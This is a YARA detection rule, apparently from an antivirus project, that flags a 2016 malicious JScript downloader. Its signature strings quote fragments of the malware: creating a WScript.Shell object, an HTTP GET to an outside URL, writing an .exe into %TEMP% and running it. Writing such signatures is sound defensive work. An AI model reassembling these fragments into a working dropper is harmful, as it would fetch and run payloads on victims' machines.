rule sig_20160330_4f446f62d024bf4789d220686a70729f {
  meta:
    description = "datamaliciousorder - file 20160330_4f446f62d024bf4789d220686a70729f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d39440d8bf54d0d4c819e51442a35fc41e97b589487a385d75e8fdecec268bd6"

  strings:
    $s1  = "var F0 = function UQ() {return WScript[RP](\"WScript\"+\".Shell\");}(), YN = 11;" fullword ascii
    $s2  = "L0[L](\"GET\", \"http://ekotrade.pl/m4ujda\", false);" fullword ascii
    $s3  = "function PI(VS, FL){IN = IN * 1; return VS - FL;};" fullword ascii
    $s4  = "if (L0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function W() {return F0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"XO0xI0RYFlx9.ex\" + \"e\";};" fullword ascii
    $s6  = "function JC(){return CD + \"\";};" fullword ascii
    $s7  = "function HU() {return ((Z0 == true) && (Z0 == F)) ? 1 : IN;};" fullword ascii
    $s8  = "function YY(HW){F0[\"Run\"](HW, IN, IN);};" fullword ascii
    $s9  = "function Q(){return 22;};" fullword ascii
    $s10 = "function SX(){return RP;};" fullword ascii
    $s11 = "return PI(Q0, N);" fullword ascii
    $s12 = "function YC(ML) {var IF = (1, 2, 3, 4, 5, ML); return IF;};" fullword ascii
    $s13 = "var WT = new this[\"Date\"]();" fullword ascii
    $s14 = "}while (JU);" fullword ascii
    $s15 = "function WK()" fullword ascii
    $s16 = "var Z0 = false;" fullword ascii
    $s17 = "var F = false;" fullword ascii
    $s18 = "F = true; " fullword ascii
    $s19 = "Z0 = true; " fullword ascii
    $s20 = "var D0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}